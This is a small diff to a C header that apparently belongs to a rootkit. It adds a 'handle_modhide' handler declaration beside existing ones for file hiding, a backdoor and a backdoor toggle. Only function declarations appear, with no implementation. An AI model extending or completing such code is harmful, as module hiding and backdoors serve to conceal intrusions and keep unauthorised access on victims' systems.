@@ -11,6 +11,7 @@ channel_t detect_channel(unsigned);
 
 // handlers
 int handle_ping(unsigned long);
+int handle_modhide(unsigned long);
 int handle_filehide(unsigned long);
 int handle_backdoor(unsigned long);
 int handle_togglebd(unsigned long);
